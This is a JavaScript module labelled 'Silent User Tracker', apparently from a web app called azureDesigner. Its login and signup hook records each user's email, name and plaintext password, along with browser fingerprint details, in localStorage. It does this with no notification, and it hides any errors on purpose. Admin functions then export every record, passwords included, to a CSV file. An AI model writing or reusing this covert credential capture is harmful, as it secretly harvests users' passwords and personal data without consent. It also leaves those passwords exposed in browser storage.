/**
 * Silent User Tracker
 * Automatically tracks user logins and saves to CSV file
 * No console output, no user notifications
 */

const TRACKING_KEY = 'azureDesigner_user_records';
const SESSION_TRACKED_KEY = 'azureDesigner_session_tracked';

/**
 * Silently track a user login
 * @param {object} userData - User data (email, name, etc.)
 * @param {string} password - User password (for admin viewing only)
 * @param {string} action - 'login' or 'signup'
 */
export const trackUserLogin = (userData, password = '', action = 'login') => {
  try {
    // Get existing records
    const records = getRecords();
    
    // Create new record
    const record = {
      email: userData.email || 'unknown',
      name: userData.name || 'unknown',
      password: password || '[not captured]',
      action: action,
      loginTime: new Date().toISOString(),
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      screenResolution: `${window.screen.width}x${window.screen.height}`,
    };
    
    // Add to records
    records.push(record);
      // Save to localStorage
    localStorage.setItem(TRACKING_KEY, JSON.stringify(records));
    
    // NO AUTO-DOWNLOAD - Admin will download manually
  } catch {
    // Silent failure - don't show errors to user
  }
};

/**
 * Get all user records
 */
const getRecords = () => {
  try {
    const data = localStorage.getItem(TRACKING_KEY);
    return data ? JSON.parse(data) : [];
  } catch {
    return [];
  }
};

/**
 * Admin-only: Export all user records to CSV
 * Regular users should NOT have access to this function
 */
export const adminExportUserRecordsCSV = () => {
  try {
    const records = getRecords();
    
    if (records.length === 0) {
      alert('No user records to export.');
      return;
    }
      // CSV headers
    const headers = [
      'Email',
      'Name',
      'Password',
      'Action',
      'Login Time',
      'User Agent',
      'Platform',
      'Language',
      'Screen Resolution'
    ];
    
    // CSV rows
    const rows = records.map(record => [
      record.email,
      record.name,
      record.password || '[not captured]',
      record.action || 'login',
      record.loginTime,
      `"${record.userAgent}"`, // Wrap in quotes to handle commas
      record.platform,
      record.language,
      record.screenResolution
    ]);
    
    // Create CSV content
    const csvContent = [
      headers.join(','),
      ...rows.map(row => row.join(','))
    ].join('\n');
    
    // Create blob and download
    const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    
    // Generate filename with date and record count
    const date = new Date().toISOString().slice(0, 10);
    link.download = `admin-user-records-${date}-${records.length}-users.csv`;
    
    // Download
    link.style.display = 'none';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);
      // Show success message to admin
    alert(`✅ Exported ${records.length} user records to CSV file.`);
  } catch {
    alert('❌ Failed to export user records.');
  }
};

/**
 * Admin-only: Get total record count
 */
export const adminGetRecordCount = () => {
  const records = getRecords();
  return records.length;
};

/**
 * Admin-only: View all records
 */
export const adminViewAllRecords = () => {
  return getRecords();
};

/**
 * Clear all records
 */
export const clearRecords = () => {
  localStorage.removeItem(TRACKING_KEY);
  sessionStorage.removeItem(SESSION_TRACKED_KEY);
};
